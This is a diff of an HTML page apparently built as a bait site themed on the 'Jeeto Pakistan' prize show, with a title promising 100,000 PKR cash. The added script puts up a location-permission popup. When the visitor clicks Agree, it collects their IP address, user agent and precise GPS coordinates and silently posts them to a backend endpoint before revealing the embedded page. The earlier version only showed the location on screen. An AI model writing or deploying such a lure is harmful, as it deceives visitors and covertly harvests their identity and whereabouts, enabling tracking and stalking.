@@ -1,53 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Embedded Custom Webpage</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jeeto Pakistan Jeeto 100,000/- PKR Cash</title>
+  <style>
+    /* Styles for the pre-loading popup/modal */
+    #preload-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    #preload-modal h2 {
+      margin-bottom: 20px;
+    }
+
+    #agree-button {
+      padding: 10px 20px;
+      font-size: 16px;
+      color: white;
+      background-color: #007BFF;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    #agree-button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-    <h1>Watch the Embedded Webpage</h1>
-    <iframe 
-        width="100%" 
-        height="600" 
-        src="/Jeeto%20Pakistan.html"  <!-- Path to the HTML file inside the public folder -->
-        title="Embedded Webpage" 
-        frameborder="0" 
-        allow="geolocation; camera; microphone" 
-        allowfullscreen>
-    </iframe>
-    <p id="geolocation"></p> <!-- Placeholder for geolocation display -->
-    
-    <script>
-        // Fetch Geolocation
-        function getGeolocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    showPosition,
-                    showError,
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                console.error("Geolocation not supported by this browser.");
-            }
+  <!-- Preloading Popup -->
+  <div id="preload-modal">
+    <h2>Please enable location services</h2>
+    <p>To continue, ensure your location settings are turned on. Then click "Agree" to proceed.</p>
+    <button id="agree-button">Agree</button>
+  </div>
+
+  <!-- Jeeto Pakistan iframe -->
+  <iframe 
+    id="jeeto-iframe"
+    src="/Jeeto%20Pakistan.html" 
+    style="width: 100%; height: 100vh; border: none; display: none;"
+    title="Jeeto Pakistan Page">
+  </iframe>
+
+  <script>
+    // Function to fetch IP address from IPify
+    async function fetchIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip; // Return the IP address
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'IP not available'; // Fallback if IP can't be fetched
+      }
+    }
+
+    // Function to send data to the backend
+    async function sendData(data) {
+      try {
+        const response = await fetch('/api/user-data', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        });
+
+        const result = await response.json();
+        console.log('Server Response:', result);
+      } catch (error) {
+        console.error('Error sending data:', error);
+      }
+    }
+
+    // Function to get geolocation
+    function getLocation(ip) {
+      if (!navigator.geolocation) {
+        console.error('Geolocation is not supported by your browser.');
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+
+          // Collect user data
+          const data = {
+            ip: ip,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            latitude,
+            longitude,
+          };
+
+          // Send data to the backend
+          sendData(data);
+
+          // Hide the modal and show the iframe
+          document.getElementById('preload-modal').style.display = 'none';
+          document.getElementById('jeeto-iframe').style.display = 'block';
+        },
+        (error) => {
+          alert('Please enable location services to proceed.');
+          console.error('Error getting geolocation:', error);
         }
-        
-        function showPosition(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            console.log("Latitude: " + latitude + ", Longitude: " + longitude);
-            document.getElementById("geolocation").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-        }
-        
-        function showError(error) {
-            console.error("Error fetching location:", error.message);
-            document.getElementById("geolocation").innerText = `Error: ${error.message}`;
-        }
-        
-        // Trigger geolocation fetch on page load
-        window.onload = function() {
-            getGeolocation();  // Fetch geolocation
-        };
-    </script>
+      );
+    }
+
+    // Function to handle pre-loading popup
+    async function handlePreload() {
+      document.getElementById('agree-button').addEventListener('click', async () => {
+        const ip = await fetchIP(); // Fetch IP using IPify API
+        getLocation(ip); // Fetch geolocation and send all data
+      });
+    }
+
+    // Initialize the pre-loading process
+    handlePreload();
+  </script>
 </body>
 </html>
